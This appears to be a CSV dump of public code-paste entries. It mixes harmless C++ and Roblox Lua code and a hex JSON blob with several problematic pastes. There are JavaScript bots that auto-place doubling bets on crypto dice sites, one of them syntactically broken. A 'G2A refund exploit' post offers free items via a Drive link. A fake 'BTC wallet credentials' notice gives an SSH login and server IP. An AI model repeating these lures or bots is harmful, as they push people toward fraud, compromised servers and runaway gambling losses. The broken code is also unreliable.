id,title,username,language,date,content
LfnXu0V9,data792,TestGuy1,JSON,Sunday 24th of December 2023 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'ee349f068a20616bfac7c59570cf49593fc3f471c103bb10a5795ba11d9656d71003e8969d22ff5c553b128b759dab28cdac96c4b0252674412c7304e0629be8394439820e406773b06ce7a8d85eda12ff598fd75763c2ce9f950485c70458b9ee400ac0011490fa817873b81ee85d3563352a5f6756b7e24888f75e45d8ed9c',
  otherdata: [
    '579ba02786d31a9d4101175d9dea8e98',
    '9abf2feccfff161e9d07aca09c5cffb2',
    '2b6d91d751653618cf31b654988b4b8a',
    '673b6ae7efa3a2a7faa6b32dbb78bc78',
    'baa3ddb22922f2ea8c3c89af1404704a',
    '51218397ee6b2f8cac7577799db5b89d',
    '04479995a98ed2b3cfcf9522f800aab3',
    '2cdd2b014f40c89e9d5937c302723f71'
  ]
}"
qZvxrGTG,Untitled,ProgMe,C++,Sunday 24th of December 2023 05:48:37 AM CDT,"#include <bits/stdc++.h>
#define int int64_t

#pragma GCC optimize(""O3"")

using namespace std;

inline int sqr(int x) {
    return x * x;
}

inline int dist(pair<int, int> x, pair<int, int> y) {
    return sqrt(sqr(x.first - y.first) + sqr(x.second - y.second));
}

inline int bruteSolution(vector<pair<int, int>>& v) {
    int ans = LLONG_MAX;
    for (int i = 0; i < v.size(); i++) {
        for (int j = i + 1; j < v.size() && j - i < 4; j++) {
            ans = min(ans, dist(v[i], v[j]));
        }
    }
    return ans;
}

int calculateAnswer(vector<pair<int, int>>& v, int l, int r) {
    if (l == r) {
        return LLONG_MAX;
    }

    int m = (l + r) / 2;
    int middle_x = v[m].first;

    int answer = min(calculateAnswer(v, l, m), calculateAnswer(v, m + 1, r));

    for (int i = l, j = m + 1; i <= m && j <= r;) {
        if (v[i] <= v[j]) {
            i++;
        } else {
            swap(v[i], v[j++]);
        }
    }

    vector<pair<int, int>> check;

    for (int i = l; i <= r; i++) {
        if (abs(v[i].first - middle_x) <= answer) {
            check.push_back(v[i]);
        }
    }

    return min(answer, bruteSolution(check));
}

int32_t main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    vector<pair<int, int>> pts;

    int x, y;
    while (cin >> x >> y) {
        pts.emplace_back(x, y);
    }
    sort(pts.begin(), pts.end());

    cout << calculateAnswer(pts, 0, pts.size() - 1);
}
"
9dT19V7j,fbtc maybe errors,coinwalk,JavaScript,Sunday 24th of December 2023 05:44:07 AM CDT,"var oldestbal = parseFloat(document.getElementById('balance').innerHTML);
var james = oldestbal;
var junky = oldestbal;
var bear = true;
var base = (oldestbal/80); 
var bellance = oldestbal;
var botplus = base;
var trget = parseFloat(oldestbal);
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.1)
var floatingbal = 0;
var betnext = ((botplus*1).toFixed(8));
var fart = 1;
 
 function getR(minz, maxz) {
  minz = Math.ceil(minz);
  maxz = Math.floor(maxz);
  return Math.floor(Math.random() * (maxz - minz + 1)) + minz;
}
 
function makeid(length) {
    var result = '';
    var cha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var chaLength = cha.length;
    for ( var ion = 0; ion < length; ion++ ){
      result += cha.charAt(Math.floor(Math.random() *
 chaLength));
   }
   return result;
} 
 
function bogus(){
bellance = document.getElementById('balance').innerHTML;
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
     botplus = botplus*2;   
     fart = 1; 
     floatingbal  = parseFloat(bellance);
}
if (((bellance-(james-tens))-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base; 
    fart = 2;
    floatingbal = 0;  
}
if (((botplus*2)>=tens)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
    fart = 1;
    james = ((Math.floor(bellance/tens))*tens);
}
if (bellance<=(james-(tens))){
    james = ((Math.floor(bellance/tens))*tens);
    botplus = base; 
    fart = 1;
    floatingbal = 0;
}
return ((botplus*1).toFixed(8));
} 

var myseed;
 
function go() {
var xol = getR(1,3);
if (xol==1) {
myseed = (makeid(5));
}
if (xol==2) {
myseed = (makeid(7));
}
if (xol==3) {
myseed = (makeid(9));
}
var xox = document.getElementById('balance').innerHTML;
if ((xox==junky)&&(bear)){
document.getElementById('next_client_seed').value = myseed;
parseFloat(document.getElementById('double_your_btc_stake').value = bogus());
parseFloat(document.getElementById('win_amount').innerHTML = bogus());
document.getElementById('double_your_btc_bet_lo_button').click();
bear = false;
}
if ((xox!=junky)&&(!bear)){
junky = parseFloat(xox);
bear = true;
}
if (xox>=(oldestbal*24)) {
return;
}
setTimeout(() => go(), 1);
}
go();"
G9Kp0U3z,fbtc without test,coinwalk,JavaScript,Sunday 24th of December 2023 05:42:04 AM CDT,"var oldestbal = parseFloat(document.getElementById('balance').innerHTML);
var james = oldestbal;
var base = (oldestbal/80); 
var bellance = oldestbal;
var botplus = base;
var trget = parseFloat(oldestbal);
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.1)
var floatingbal = 0;
var betnext = ((botplus*1).toFixed(8));
var fart = 1;
 
 function getR(minz, maxz) {
  minz = Math.ceil(minz);
  maxz = Math.floor(maxz);
  return Math.floor(Math.random() * (maxz - minz + 1)) + minz;
}
 
function makeid(length) {
    var result = '';
    var cha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var chaLength = cha.length;
    for ( var ion = 0; ion < length; ion++ ){
      result += cha.charAt(Math.floor(Math.random() *
 chaLength));
   }
   return result;
} 
 
function bogus(){
bellance = document.getElementById('balance').innerHTML;
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
     botplus = botplus*2;   
     fart = 1; 
     floatingbal  = parseFloat(bellance);
}
if (((bellance-(james-tens))-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base; 
    fart = 2;
    floatingbal = 0;  
}
if (((botplus*2)>=tens)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
    fart = 1;
    james = ((Math.floor(bellance/tens))*tens);
}
if (bellance<=(james-(tens))){
    james = ((Math.floor(bellance/tens))*tens);
    botplus = base; 
    fart = 1;
    floatingbal = 0;
}
return ((botplus*1).toFixed(8));
} 

var myseed;
 
function go() {
var xol = getR(1,3);
if (xol==1) {
myseed = (makeid(5));
}
if (xol==2) {
myseed = (makeid(7));
}
if (xol==3) {
myseed = (makeid(9));
}
var xox = document.getElementById('balance').innerHTML;
if ((xox==junky)&&(bear)){
document.getElementById('next_client_seed').value = myseed;
parseFloat(document.getElementById('double_your_btc_stake').value = bogus());
parseFloat(document.getElementById('win_amount').innerHTML = bogus());
document.getElementById('double_your_btc_bet_lo_button').click();
bear = false;
}
if ((xox!=junky)&&(!bear)){
junky = parseFloat(xox);
bear = true;
}
if (xox>=(oldestbal*24)) {
return;
}
setTimeout(() => go(), 1);
}
go();"
qMHcKnx9,G2A.com Refund Exploit Dec 2023,G2ARefundExploit,GetText,Sunday 24th of December 2023 05:21:07 AM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1AKxSk9vs38aBF7GEDJxf8mNi-_NVRLQ9/view#g2a_refund_exploit.pdf

Working as of 
24 December 2023

844268"
5EE7G4dB,Untitled,Josif_tepe,C++,Sunday 24th of December 2023 05:17:23 AM CDT,"#include <iostream>

using namespace std;

int main() {
    
    string text;
    string pattern;
    cin >> text;
    cin >> pattern;
    
    for(int i = 0; i < (int) text.size(); i++) {
        if(text[i] == pattern[0]) {
            bool ok = true;
            for(int j = 0; j < (int) pattern.size(); j++) {
                if(i + j >= (int) text.size() or pattern[j] != text[i + j]) {
                    ok = false;
                    break;
                }
            }
            if(ok) {
                cout << ""DA postoi"" << endl;
            }
        }
    }

   return 0;
}
"
5c1ZZyE6,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 24th of December 2023 05:04:26 AM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-464800"
Lz99QXUJ,better snowybot,coinwalk,JavaScript,Sunday 24th of December 2023 04:07:54 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = (oldestbal/1000); 
var bellance = oldestbal;
var botplus = base;
var trget = parseFloat(oldestbal);
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.1)
var floatingbal = 0;
var betnext = ((botplus*1).toFixed(8));
var fart = 1;

 
function get(){
bellance = document.getElementById('pct_balance').value;
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
     botplus = botplus*2;   
     fart = 1; 
     floatingbal  = parseFloat(bellance);
}
if ((((bellance-(oldestbal-(tens*fart)))-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base; 
    fart = 2;
    floatingbal = 0;  
}
if (((botplus*2)>=tens)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
    fart = 1;
    oldestbal = parseFloat(((Math.floor(bellance/tens))*tens));
}
if ((((bellance-(oldestbal-(tens*fart)))-(botplus*2))<=0)&&(bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base*2;
    fart = 2;
    floatingbal  = parseFloat(bellance); 
}
if ((bellance-(oldestbal-(tens)))<=0){
oldestbal = parseFloat(((Math.floor(bellance/tens))*tens));
botplus = base; 
fart = 1;
floatingbal = 0;
}
if (bellance>(trget*24)){
console.log(""buy ebike"")
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 1200);
}
get();"
cZBGKv9X,good snowybot,coinwalk,JavaScript,Sunday 24th of December 2023 03:59:18 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = (oldestbal/1000); 
var bellance = oldestbal;
var botplus = base;
var trget = parseFloat(oldestbal);
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.1)
var floatingbal = 0;
var betnext = ((botplus*1).toFixed(8));
var fart = 1;

 
function get(){
bellance = document.getElementById('pct_balance').value;
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
     botplus = botplus*2;    
     floatingbal  = parseFloat(bellance);
}
if ((((bellance-(oldestbal-(tens*fart)))-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base; 
    fart = 2;
    floatingbal = 0;  
}
if (((botplus*2)>=tens)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
    fart = 1;
    oldestbal = parseFloat(((Math.floor(bellance/tens))*tens));
}
if ((((bellance-(oldestbal-(tens*fart)))-(botplus*2))<=0)&&(bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base*2;
    fart = 2;
    floatingbal  = parseFloat(bellance); 
}
if ((bellance-(oldestbal-(tens)))<=0){
oldestbal = parseFloat(((Math.floor(bellance/tens))*tens));
botplus = base; 
fart = 1;
floatingbal = 0;
}
if (bellance>(trget*24)){
console.log(""buy ebike"")
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 1200);
}
get();"
KhmwN7uN,sword!!!! (unfinished),LikeableEmmec,Lua,Sunday 24th of December 2023 03:56:05 AM CDT,"-- i tried making this script as small as i possibly could, but unfortunately theres just too much things that need to be inserted

--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k==""script"" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new(""Model"",game:GetService(""Lighting""))
Model0 = Instance.new(""Model"")
Part1 = Instance.new(""Part"")
ParticleEmitter2 = Instance.new(""ParticleEmitter"")
Weld3 = Instance.new(""Weld"")
Weld4 = Instance.new(""Weld"")
Weld5 = Instance.new(""Weld"")
Weld6 = Instance.new(""Weld"")
Weld7 = Instance.new(""Weld"")
Weld8 = Instance.new(""Weld"")
Weld9 = Instance.new(""Weld"")
Weld10 = Instance.new(""Weld"")
Weld11 = Instance.new(""Weld"")
Weld12 = Instance.new(""Weld"")
Weld13 = Instance.new(""Weld"")
Weld14 = Instance.new(""Weld"")
Weld15 = Instance.new(""Weld"")
Weld16 = Instance.new(""Weld"")
Weld17 = Instance.new(""Weld"")
Weld18 = Instance.new(""Weld"")
Weld19 = Instance.new(""Weld"")
Weld20 = Instance.new(""Weld"")
Weld21 = Instance.new(""Weld"")
Weld22 = Instance.new(""Weld"")
Weld23 = Instance.new(""Weld"")
Weld24 = Instance.new(""Weld"")
Weld25 = Instance.new(""Weld"")
Weld26 = Instance.new(""Weld"")
Weld27 = Instance.new(""Weld"")
Weld28 = Instance.new(""Weld"")
Weld29 = Instance.new(""Weld"")
Weld30 = Instance.new(""Weld"")
Weld31 = Instance.new(""Weld"")
Weld32 = Instance.new(""Weld"")
Weld33 = Instance.new(""Weld"")
Weld34 = Instance.new(""Weld"")
Weld35 = Instance.new(""Weld"")
Weld36 = Instance.new(""Weld"")
Weld37 = Instance.new(""Weld"")
Weld38 = Instance.new(""Weld"")
Weld39 = Instance.new(""Weld"")
Weld40 = Instance.new(""Weld"")
Weld41 = Instance.new(""Weld"")
Weld42 = Instance.new(""Weld"")
Weld43 = Instance.new(""Weld"")
Weld44 = Instance.new(""Weld"")
Weld45 = Instance.new(""Weld"")
Weld46 = Instance.new(""Weld"")
Weld47 = Instance.new(""Weld"")
Weld48 = Instance.new(""Weld"")
Part49 = Instance.new(""Part"")
Part50 = Instance.new(""Part"")
Part51 = Instance.new(""Part"")
Part52 = Instance.new(""Part"")
Part53 = Instance.new(""Part"")
Part54 = Instance.new(""Part"")
Part55 = Instance.new(""Part"")
Part56 = Instance.new(""Part"")
Part57 = Instance.new(""Part"")
Part58 = Instance.new(""Part"")
Part59 = Instance.new(""Part"")
Part60 = Instance.new(""Part"")
Part61 = Instance.new(""Part"")
Part62 = Instance.new(""Part"")
Part63 = Instance.new(""Part"")
Part64 = Instance.new(""Part"")
Part65 = Instance.new(""Part"")
Part66 = Instance.new(""Part"")
Part67 = Instance.new(""Part"")
Part68 = Instance.new(""Part"")
Part69 = Instance.new(""Part"")
Part70 = Instance.new(""Part"")
Part71 = Instance.new(""Part"")
Part72 = Instance.new(""Part"")
Part73 = Instance.new(""Part"")
Part74 = Instance.new(""Part"")
Part75 = Instance.new(""Part"")
Part76 = Instance.new(""Part"")
Part77 = Instance.new(""Part"")
Part78 = Instance.new(""Part"")
Part79 = Instance.new(""Part"")
Part80 = Instance.new(""Part"")
Part81 = Instance.new(""Part"")
Part82 = Instance.new(""Part"")
Part83 = Instance.new(""Part"")
Part84 = Instance.new(""Part"")
Part85 = Instance.new(""Part"")
Part86 = Instance.new(""Part"")
Part87 = Instance.new(""Part"")
Part88 = Instance.new(""Part"")
Part89 = Instance.new(""Part"")
Part90 = Instance.new(""Part"")
Part91 = Instance.new(""Part"")
Part92 = Instance.new(""Part"")
Part93 = Instance.new(""Part"")
Part94 = Instance.new(""Part"")
Part95 = Instance.new(""Part"")
SpecialMesh96 = Instance.new(""SpecialMesh"")
Decal97 = Instance.new(""Decal"")
Script98 = Instance.new(""Script"")
Script98.Parent = mas
Model0.Parent = Script98
Part1.Name = ""Main""
Part1.Position = Vector3.new(-0.088, 1.805, 15.744)
Part1.Orientation = Vector3.new(0,180,0)
Part1.Anchored = true
Part1.Parent = Model0
Part1.Size = Vector3.new(1.8447951078414917, 1.0458904504776, 1.111020565032959)
Part1.BrickColor = BrickColor.new(""Dark stone grey"")
Part1.Material = Enum.Material.Limestone
ParticleEmitter2.Name = ""Dust""
ParticleEmitter2.Parent = Part1
ParticleEmitter2.Speed = NumberRange.new(0.5, 0.5)
ParticleEmitter2.LightInfluence = 1
ParticleEmitter2.Size = NumberSequence.new(0.02500000037252903,0.02500000037252903)
ParticleEmitter2.Lifetime = NumberRange.new(10, 10)
ParticleEmitter2.LockedToPart = true
ParticleEmitter2.Rate = 10
ParticleEmitter2.SpreadAngle = Vector2.new(360, 360)
ParticleEmitter2.VelocitySpread = 360
Weld3.Parent = Part1
Weld3.C0 = CFrame.new(-1.62742424, -1.65402889, -0.298660278, -0.0123990364, 0.803554535, 0.595102072, -0.855896473, 0.299185395, -0.421816826, -0.516998649, -0.514575839, 0.684049785)
Weld3.Part0 = Part1
Weld3.Part1 = Part49
Weld4.Parent = Part1
Weld4.C0 = CFrame.new(-1.30332565, -1.66249919, -0.662700653, -0.157534987, -0.974547744, -0.159497529, -0.739786625, 0.223455191, -0.634652317, 0.654139578, 0.0180141963, -0.756159365)
Weld4.Part0 = Part1
Weld4.Part1 = Part50
Weld5.Parent = Part1
Weld5.C0 = CFrame.new(-2.0207901, -2.8342557, -1.00005722, 0.961932003, -0.183506295, -0.202514857, 0.0896580145, 0.911919653, -0.400454909, 0.258163244, 0.3670533, 0.893657446)
Weld5.Part0 = Part1
Weld5.Part1 = Part51
Weld6.Parent = Part1
Weld6.C0 = CFrame.new(-0.985092163, -0.620789289, -0.708850861, 0.39966169, 0.112673476, 0.909711599, 0.418754339, 0.860369503, -0.290532559, -0.815423489, 0.497060418, 0.296674222)
Weld6.Part0 = Part1
Weld6.Part1 = Part52
Weld7.Parent = Part1
Weld7.C0 = CFrame.new(-0.441106796, -1.78672659, -0.507808685, -0.0955647454, -0.991187751, -0.0917297378, -0.339432985, 0.119076774, -0.933062673, 0.935763121, -0.0580318049, -0.347821325)
Weld7.Part0 = Part1
Weld7.Part1 = Part53
Weld8.Parent = Part1
Weld8.C0 = CFrame.new(-0.518413544, -0.552452922, -0.315631866, 0.961932003, -0.183506295, -0.202514827, 0.0896580145, 0.911919653, -0.400454879, 0.258163244, 0.3670533, 0.893657446)
Weld8.Part0 = Part1
Weld8.Part1 = Part54
Weld9.Parent = Part1
Weld9.C0 = CFrame.new(-0.48207283, -0.771619081, -0.82699585, -0.941015422, -0.262778252, 0.213161245, 0.251712024, -0.122652248, 0.959998727, -0.226122111, 0.957028747, 0.181562096)
Weld9.Part0 = Part1
Weld9.Part1 = Part55
Weld10.Parent = Part1
Weld10.C0 = CFrame.new(-0.538236618, -2.81401229, -2.13531876, 0.131795928, -0.912253916, 0.387843549, 0.533969164, -0.264305979, -0.803130984, 0.835168719, 0.312945902, 0.452281058)
Weld10.Part0 = Part1
Weld10.Part1 = Part56
Weld11.Parent = Part1
Weld11.C0 = CFrame.new(-1.59398079, -2.19653368, 0.151702881, -0.606387377, 0.248504475, 0.755340934, 0.494581729, 0.861680388, 0.113560215, -0.622642219, 0.442439288, -0.64541775)
Weld11.Part0 = Part1
Weld11.Part1 = Part57
Weld12.Parent = Part1
Weld12.C0 = CFrame.new(-1.49403381, -2.56299853, -1.38790512, 0.183451474, -0.26985538, -0.945263803, 0.737415552, 0.673645139, -0.0491998233, 0.65004921, -0.688026428, 0.322576761)
Weld12.Part0 = Part1
Weld12.Part1 = Part58
Weld13.Parent = Part1
Weld13.C0 = CFrame.new(0.855331421, 0.110949636, 1.47911453, -0.319102496, -0.890573382, 0.324118495, 0.208141714, -0.399504602, -0.892789483, 0.924581349, -0.217428774, 0.312848359)
Weld13.Part0 = Part1
Weld13.Part1 = Part59
Weld14.Parent = Part1
Weld14.C0 = CFrame.new(-0.744325638, -1.76737642, 1.28087234, -0.576937139, 0.734499276, -0.357287586, 0.361600131, -0.162544847, -0.9180547, -0.732385755, -0.65885514, -0.171816871)
Weld14.Part0 = Part1
Weld14.Part1 = Part60
Weld15.Parent = Part1
Weld15.C0 = CFrame.new(0.0887203217, -1.69801128, 0.389862061, 0.183451474, -0.26985538, -0.945263803, 0.737415552, 0.673645139, -0.0491998233, 0.65004921, -0.688026428, 0.322576761)
Weld15.Part0 = Part1
Weld15.Part1 = Part61
Weld16.Parent = Part1
Weld16.C0 = CFrame.new(0.230297089, -1.84559774, -0.333618164, -0.606387377, 0.248504475, 0.755340934, 0.494581729, 0.861680388, 0.113560215, -0.622642219, 0.442439288, -0.64541775)
Weld16.Part0 = Part1
Weld16.Part1 = Part62
Weld17.Parent = Part1
Weld17.C0 = CFrame.new(1.14164734, -0.921744108, -0.730018616, -0.0955647454, -0.991187751, -0.0917297378, -0.339432985, 0.119076774, -0.933062673, 0.935763121, -0.0580318049, -0.347821325)
Weld17.Part0 = Part1
Weld17.Part1 = Part63
Weld18.Parent = Part1
Weld18.C0 = CFrame.new(0.279428482, -0.797514081, 1.11507034, -0.157534987, -0.974547744, -0.159497529, -0.739786625, 0.223455191, -0.634652317, 0.654139578, 0.0180141963, -0.756159365)
Weld18.Part0 = Part1
Weld18.Part1 = Part64
Weld19.Parent = Part1
Weld19.C0 = CFrame.new(-0.0446681976, -0.789039373, 1.4791069, -0.0123990364, 0.803554535, 0.595102072, -0.855896473, 0.299185395, -0.421816826, -0.516998649, -0.514575839, 0.684049785)
Weld19.Part0 = Part1
Weld19.Part1 = Part65
Weld20.Parent = Part1
Weld20.C0 = CFrame.new(-0.239549637, -0.764985323, 0.903736115, -0.0123990364, 0.803554535, 0.595102072, -0.855896473, 0.299185395, -0.421816826, -0.516998649, -0.514575839, 0.684049785)
Weld20.Part0 = Part1
Weld20.Part1 = Part66
Weld21.Parent = Part1
Weld21.C0 = CFrame.new(1.04451752, -1.94902587, -1.25753403, 0.131795928, -0.912253916, 0.387843549, 0.533969164, -0.264305979, -0.803130984, 0.835168719, 0.312945902, 0.452281058)
Weld21.Part0 = Part1
Weld21.Part1 = Part67
Weld22.Parent = Part1
Weld22.C0 = CFrame.new(0.150651932, -1.70430422, -0.901477814, -0.902625918, -0.248075932, -0.351745516, -0.429858297, 0.561501384, 0.707063019, 0.0221002605, 0.789414108, -0.613463163)
Weld22.Part0 = Part1
Weld22.Part1 = Part68
Weld23.Parent = Part1
Weld23.C0 = CFrame.new(-0.438035965, -1.96927178, 0.777713776, 0.961932003, -0.183506295, -0.202514857, 0.0896580145, 0.911919653, -0.400454909, 0.258163244, 0.3670533, 0.893657446)
Weld23.Part0 = Part1
Weld23.Part1 = Part69
Weld24.Parent = Part1
Weld24.C0 = CFrame.new(0.400941849, -1.55901909, 1.61625671, 0.999867141, -0.0115958629, -0.0114646284, 0.0134438463, 0.18830739, 0.982018232, -0.00922847353, -0.982041717, 0.188438252)
Weld24.Part0 = Part1
Weld24.Part1 = Part70
Weld25.Parent = Part1
Weld25.C0 = CFrame.new(0.963367462, -1.16474319, 1.10194016, -0.637993515, 0.0767424107, -0.766208112, 0.274486214, 0.952324986, -0.133170962, 0.719459355, -0.295275778, -0.628641844)
Weld25.Part0 = Part1
Weld25.Part1 = Part71
Weld26.Parent = Part1
Weld26.C0 = CFrame.new(1.38624573, -1.61833596, 0.292377472, 0.961932003, -0.183506295, -0.202514857, 0.0896580145, 0.911919653, -0.400454909, 0.258163244, 0.3670533, 0.893657446)
Weld26.Part0 = Part1
Weld26.Part1 = Part72
Weld27.Parent = Part1
Weld27.C0 = CFrame.new(1.42259216, -1.83750343, -0.218975067, -0.941015422, -0.262778282, 0.213161215, 0.251712024, -0.12265233, 0.959998727, -0.226122111, 0.957028747, 0.18156217)
Weld27.Part0 = Part1
Weld27.Part1 = Part73
Weld28.Parent = Part1
Weld28.C0 = CFrame.new(0.294971466, -0.677574635, -0.0209999084, 0.895324886, 0.439857781, 0.0701317862, -0.288690984, 0.453155041, 0.843390882, 0.339191377, -0.77535522, 0.532703936)
Weld28.Part0 = Part1
Weld28.Part1 = Part74
Weld29.Parent = Part1
Weld29.C0 = CFrame.new(0.702026367, -2.07932663, -0.817646027, -0.856759548, 0.475791931, 0.198960349, 0.34076798, 0.811865807, -0.474079281, -0.387092143, -0.338372618, -0.857708395)
Weld29.Part0 = Part1
Weld29.Part1 = Part75
Weld30.Parent = Part1
Weld30.C0 = CFrame.new(0.919578552, -1.68667173, -0.100826263, 0.39966175, 0.112673454, 0.909711659, 0.418754339, 0.860369503, -0.290532619, -0.815423369, 0.497060448, 0.296674311)
Weld30.Part0 = Part1
Weld30.Part1 = Part76
Weld31.Parent = Part1
Weld31.C0 = CFrame.new(1.03403854, -0.989437282, 0.101238251, 0.777184427, -0.318974048, -0.542438984, -0.107409902, -0.916601777, 0.385102987, -0.62003845, -0.241032749, -0.746629477)
Weld31.Part0 = Part1
Weld31.Part1 = Part77
Weld32.Parent = Part1
Weld32.C0 = CFrame.new(0.460496902, -1.56527185, 1.4454422, -0.856759548, 0.475791931, 0.198960349, 0.34076798, 0.811865807, -0.474079281, -0.387092143, -0.338372618, -0.857708395)
Weld32.Part0 = Part1
Weld32.Part1 = Part78
Weld33.Parent = Part1
Weld33.C0 = CFrame.new(-0.0112285614, -1.33154798, 1.92947769, -0.606387377, 0.248504475, 0.755340934, 0.494581729, 0.861680388, 0.113560215, -0.622642219, 0.442439288, -0.64541775)
Weld33.Part0 = Part1
Weld33.Part1 = Part79
Weld34.Parent = Part1
Weld34.C0 = CFrame.new(-0.54467392, 0.110955119, 1.1791153, 0.319102317, 0.890571415, -0.324123949, 0.208137766, -0.399509072, -0.89278847, -0.924582303, 0.217428446, -0.312845767)
Weld34.Part0 = Part1
Weld34.Part1 = Part80
Weld35.Parent = Part1
Weld35.C0 = CFrame.new(-0.636602402, -0.915021777, 1.11136246, -0.00308411149, 0.991187274, -0.13243261, -0.458722949, -0.11907959, -0.880564213, -0.888574004, 0.0580341145, 0.455047548)
Weld35.Part0 = Part1
Weld35.Part1 = Part81
Weld36.Parent = Part1
Weld36.C0 = CFrame.new(-0.196508408, -2.48332548, -1.48538208, 0.961932003, -0.183506295, -0.202514857, 0.0896580145, 0.911919653, -0.400454909, 0.258163244, 0.3670533, 0.893657446)
Weld36.Part0 = Part1
Weld36.Part1 = Part82
Weld37.Parent = Part1
Weld37.C0 = CFrame.new(-1.12225914, -2.43025804, -0.332328796, -0.856759548, 0.475791931, 0.198960349, 0.34076798, 0.811865807, -0.474079281, -0.387092143, -0.338372618, -0.857708395)
Weld37.Part0 = Part1
Weld37.Part1 = Part83
Weld38.Parent = Part1
Weld38.C0 = CFrame.new(-1.18181229, -2.4240036, 0.13848114, 0.999867141, -0.0115958629, -0.0114646284, 0.0134438463, 0.18830739, 0.982018232, -0.00922847353, -0.982041717, 0.188438252)
Weld38.Part0 = Part1
Weld38.Part1 = Part84
Weld39.Parent = Part1
Weld39.C0 = CFrame.new(-0.160154343, -2.70248795, -1.19675064, -0.941015422, -0.262778282, 0.213161215, 0.251712024, -0.12265233, 0.959998727, -0.226122111, 0.957028747, 0.18156217)
Weld39.Part0 = Part1
Weld39.Part1 = Part85
Weld40.Parent = Part1
Weld40.C0 = CFrame.new(0.253322601, -0.231796265, -0.468158722, -0.902625918, -0.248075932, -0.351745516, -0.429858297, 0.561501384, 0.707063019, 0.0221002605, 0.789414108, -0.613463163)
Weld40.Part0 = Part1
Weld40.Part1 = Part86
Weld41.Parent = Part1
Weld41.C0 = CFrame.new(0.330251694, -2.21206284, -1.47322845, 0.183451474, -0.26985538, -0.945263803, 0.737415552, 0.673645139, -0.0491998233, 0.65004921, -0.688026428, 0.322576761)
Weld41.Part0 = Part1
Weld41.Part1 = Part87
Weld42.Parent = Part1
Weld42.C0 = CFrame.new(0.520959854, -1.31156647, -0.548030853, -0.157534987, -0.974547744, -0.159497529, -0.739786625, 0.223455191, -0.634652317, 0.654139578, 0.0180141963, -0.756159365)
Weld42.Part0 = Part1
Weld42.Part1 = Part88
Weld43.Parent = Part1
Weld43.C0 = CFrame.new(-0.619382858, -2.02973127, 0.124168396, -0.637993515, 0.0767424107, -0.766208112, 0.274486214, 0.952324986, -0.133170962, 0.719459355, -0.295275778, -0.628641844)
Weld43.Part0 = Part1
Weld43.Part1 = Part89
Weld44.Parent = Part1
Weld44.C0 = CFrame.new(-0.588409424, -1.3924396, 0.176280975, -0.946040094, 0.305283636, 0.108674251, -0.197276771, -0.808637738, 0.554244459, 0.25707984, 0.502898574, 0.825229108)
Weld44.Part0 = Part1
Weld44.Part1 = Part90
Weld45.Parent = Part1
Weld45.C0 = CFrame.new(0.196855545, -1.30309427, -0.783992767, -0.0123990364, 0.803554535, 0.595102072, -0.855896473, 0.299185395, -0.421816826, -0.516998649, -0.514575839, 0.684049785)
Weld45.Part0 = Part1
Weld45.Part1 = Part91
Weld46.Parent = Part1
Weld46.C0 = CFrame.new(-1.28778267, -1.54257441, 0.301223755, 0.895325422, 0.439858109, 0.0701317266, -0.28869167, 0.45315209, 0.843389571, 0.339192688, -0.775350988, 0.532702327)
Weld46.Part0 = Part1
Weld46.Part1 = Part92
Weld47.Parent = Part1
Weld47.C0 = CFrame.new(-0.663171768, -2.55169177, -1.87859726, 0.399660617, 0.112673447, 0.909712136, 0.418754548, 0.860369623, -0.290532023, -0.815423906, 0.497060299, 0.296673298)
Weld47.Part0 = Part1
Weld47.Part1 = Part93
Weld48.Parent = Part1
